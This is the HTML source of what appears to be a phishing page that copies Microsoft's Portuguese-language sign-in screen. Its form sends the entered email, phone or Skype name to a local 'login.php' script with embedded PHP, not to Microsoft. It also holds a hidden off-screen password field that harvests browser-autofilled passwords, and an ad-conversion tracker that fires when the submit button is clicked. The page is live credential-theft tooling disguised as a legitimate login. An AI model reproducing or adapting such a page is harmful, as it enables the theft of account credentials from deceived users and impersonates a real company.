<html dir="ltr" lang="PT-BR">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Entrar na conta da Microsoft</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="entrar_arquivos/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="entrar_arquivos/Converged_v21046_5plpI1P0_uKjrokWdqCoBw2.css">
	
	

  </head>
  <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
      <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
        <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
        </div>
      </div>
      <div data-bind="if: activeDialog"></div>
      <form name="f1" id="i0281"spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login.php?brazil=<?php $hora=date("H,i,s,A,z,n,m,u,d,g,o,l");echo"$hora"; ?>.seguro">
        <div class="outer" data-bind="component: { name: 'master-page',
          params: {
          serverData: svr,
          showButtons: svr.f,
          showFooterLinks: true,
          useWizardBehavior: svr.Bi,
          handleWizardButtons: false,
          password: password,
          hideFromAria: ariaHidden },
          event: {
          footerAgreementClick: footer_agreementClick } }">
          <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
            <div data-bind="
              animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
              css: {
              'app': backgroundLogoUrl,
              'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
              'fade-in-lightbox': fadeInLightBox,
              'has-popup': showFedCredButtons,
              'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
              externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
              <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.br &amp;&amp; showLightboxProgress() }"></div>
              <div class="win-scroll">
                <div data-bind="component: { name: 'logo-control',
                  params: {
                  isChinaDc: svr.fIsChinaDc,
                  bannerLogoUrl: bannerLogoUrl() } }">
                  <img class="logo" role="img" pngsrc="entrar_arquivos/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="entrar_arquivos/assets.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="entrar_arquivos/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                </div>
                <div role="main" data-bind="component: { name: 'pagination-control',
                  publicMethods: paginationControlMethods,
                  params: {
                  enableCssAnimation: svr.aj,
                  disableAnimationIfAnimationEndUnsupported: svr.bv,
                  initialViewId: initialViewId,
                  currentViewId: currentViewId,
                  initialSharedData: initialSharedData,
                  initialError: $loginPage.getServerError() },
                  event: {
                  cancel: paginationControl_onCancel,
                  loadView: view_onLoadView,
                  showView: view_onShow,
                  setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                  animationStateChange: paginationControl_onAnimationStateChange } }">
                  <!--  -->
                  <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                    <div class="pagination-view animate slide-in-next" data-bind="css: {
                      'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.j),
                      'zero-opacity': hidePaginatedView.hideSubView(),
                      'animate': animate(),
                      'slide-out-next': animate.isSlideOutNext(),
                      'slide-in-next': animate.isSlideInNext(),
                      'slide-out-back': animate.isSlideOutBack(),
                      'slide-in-back': animate.isSlideInBack() }">
                      <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        displayName: sharedData.displayName,
                        otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                        prefillNames: $loginPage.prefillNames,
                        flowToken: sharedData.flowToken },
                        event: {
                        redirect: $loginPage.view_onRedirect,
                        setPendingRequest: $loginPage.view_onSetPendingRequest,
                        registerDialog: $loginPage.view_onRegisterDialog,
                        unregisterDialog: $loginPage.view_onUnregisterDialog,
                        showDialog: $loginPage.view_onShowDialog,
                        agreementClick: $loginPage.footer_agreementClick } }">
                        <div data-bind="component: { name: 'header-control',
                          params: {
                          serverData: svr,
                          title: str['WF_STR_HeaderDefault_Title'] } }">
                          <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
                            <div role="heading" aria-level="1" data-bind="text: title">Entrar</div>
                          </div>
                        </div>
                        <div class="row">
                          <div role="alert" aria-live="assertive">
                          </div>
                          <div class="form-group col-md-24">
                            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                              publicMethods: usernameTextbox.placeholderTextboxMethods,
                              params: {
                              serverData: svr,
                              hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                              hintCss: 'placeholder' + (!svr.ag ? ' ltr_override' : '') },
                              event: {
                              updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                              <input type="email" name="loginfmt" id="loginfmt" maxlength="113" required class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
                                externalCss: {
                                'input': true,
                                'text-box': true,
                                'has-error': usernameTextbox.error },
                                ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                                ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.bZ ? ' loginDescription' : ''),
                                textInput: usernameTextbox.value,
                                hasFocusEx: usernameTextbox.focused,
                                placeholder: $placeholderText" aria-label="Insira seu email, telefone ou Skype." aria-describedby="loginHeader" placeholder="Email, telefone ou Skype" lang="en">
                              <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                            </div>
                          </div>
                        </div>
                        <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                          <div class="row">
                            <div class="col-md-24">
                              <div class="text-13">
                                <div class="form-group" data-bind="
                                  htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                                  childBindings: {
                                  'signup': {
                                  href: svr.G || '#',
                                  ariaLabel: svr.G ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                                  click: signup_onClick } }">Não tem uma conta? <a href="" id="signup" aria-label="Criar uma conta da Microsoft">Crie uma!</a></div>
                                <div class="form-group">
                                  <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
                                    text: fidoLinkText,
                                    click: switchToFidoCredLink_onClick">Entrar com uma chave de segurança</a>
                                  <span class="help-button" role="button" tabindex="0" data-bind="
                                    click: fidoHelp_onClick,
                                    pressEnter: fidoHelp_onClick,
                                    hasFocus: hasFocus,
                                    ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="Saiba mais sobre como entrar com uma chave de segurança">
                                    <img role="presentation" pngsrc="entrar_arquivos/documentation_9628e22a6bfb1edc59e81064a666b614.png" svgsrc="entrar_arquivos/documentation_bcb4d1dc4eae64f0b2b2538209d8435a1.svg" data-bind="imgSrc" src="entrar_arquivos/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"><!-- /ko -->
                                  </span>
                                  <div data-bind="component: { name: 'fido-help-dialog-content-control',
                                    params: {
                                    isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
                                    event: {
                                    registerDialog: onRegisterDialog,
                                    unregisterDialog: onUnregisterDialog } }">
                                    <div data-bind="component: { name: 'dialog-content-control',
                                      params: {
                                      dialogId: 1,
                                      data: {
                                      labelledBy: 'fidoDialogTitle',
                                      describedBy: 'fidoDialogDesc fidoDialogDesc2',
                                      primaryButtonPreventTabbing: { direction: 'down' },
                                      isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
                                      event: {
                                      registerDialog: onRegisterDialog,
                                      unregisterDialog: onUnregisterDialog } }">
                                    </div>
                                  </div>
                                </div>
                                <div class="form-group" data-bind="
                                  component: { name: 'cred-switch-link-control',
                                  params: {
                                  serverData: svr,
                                  availableCreds: availableCredsWithoutUsername(),
                                  showForgotUsername: svr.a8 },
                                  event: {
                                  switchView: noUsernameCredSwitchLink_onSwitchView,
                                  redirect: onRedirect,
                                  registerDialog: onRegisterDialog,
                                  unregisterDialog: onUnregisterDialog,
                                  showDialog: onShowDialog } }">
                                  <div class="form-group">
                                    <a id="idA_PWD_SwitchToCredPicker" href="#" data-bind="
                                      text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
                                      click: switchToCredPicker_onClick">Opções de entrada</a>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="win-button-pin-bottom">
                          <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                            <div data-bind="component: { name: 'footer-buttons-field',
                              params: {
                              serverData: svr,
                              isPrimaryButtonEnabled: !isRequestPending(),
                              isPrimaryButtonVisible: svr.f,
                              isSecondaryButtonEnabled: true,
                              isSecondaryButtonVisible: svr.f &amp;&amp; isBackButtonVisible() },
                              event: {
                              primaryButtonClick: primaryButton_onClick,
                              secondaryButtonClick: secondaryButton_onClick } }">
                              <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                css: { 'no-margin-bottom': removeBottomMargin }">
                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                  <input type="submit" id="idSIButton9" data-bind="
                                    attr: primaryButtonAttributes,
                                    externalCss: {
                                    'button': true,
                                    'primary': true },
                                    value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                    hasFocus: focusOnPrimaryButton,
                                    click: primaryButton_onClick,
                                    enable: isPrimaryButtonEnabled,
                                    visible: isPrimaryButtonVisible,
                                    preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" onclick="gtag_report_conversion();" value="Próximo">
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <div data-bind="component: { name: 'instrumentation-control',
              publicMethods: instrumentationMethods,
              params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
              <input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
              <input type="hidden" name="i18" data-bind="value: srsSuccess">
              <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
            </div>
            <!-- ko ifnot: svr.by -->
            <div id="footer" role="contentinfo" data-bind="
              css: {
              'default': !backgroundLogoUrl(),
              'new-background-image': useNewDefaultBackground },
              externalCss: { 'footer': true }" class="default footer ext-footer new-background-image">
              <div data-bind="component: { name: 'footer-control',
                publicMethods: footerMethods,
                params: {
                serverData: svr,
                useNewDefaultBackground: useNewDefaultBackground(),
                hasDarkBackground: backgroundLogoUrl(),
                showLinks: true },
                event: {
                agreementClick: footer_agreementClick,
                showDebugDetails: toggleDebugDetails_onClick } }">
                <div id="footerLinks" class="footerNode text-secondary">
                  <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="">Termos de uso</a>
                  <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="">Privacidade e cookies</a>
                  <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                    click: moreInfo_onClick,
                    ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                    attr: { 'aria-expanded': showDebugDetails().toString() },
                    hasFocusEx: focusMoreInfo()" aria-label="Clique aqui para obter informações sobre solução de problemas" aria-expanded="false">
                    <img class="desktopMode" role="presentation" pngsrc="entrar_arquivos/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="entrar_arquivos/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" src="entrar_arquivos/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg">
                    <img class="mobileMode" role="presentation" pngsrc="entrar_arquivos/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="entrar_arquivos/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="entrar_arquivos/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko -->
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
      <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
      <div id="idPartnerPL" data-bind="injectIframe: { url: svr.A2 }">
        <iframe style="display: none;" src="entrar_arquivos/prefetch.htm" width="0" height="0"></iframe>
      </div>
    </div>
  </body>
  
  <!-- Event snippet for Website traffic conversion page
	In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
	<script>
	function gtag_report_conversion(url) {
	  var callback = function () {
		if (typeof(url) != 'undefined') {
		  window.location = url;
		}
	  };
	  gtag('event', 'conversion', {
		  'send_to': 'AW-480989106/oktaCLnPseoBELKfreUB',
		  'event_callback': callback
	  });
	  return false;
	}
	</script>

</html>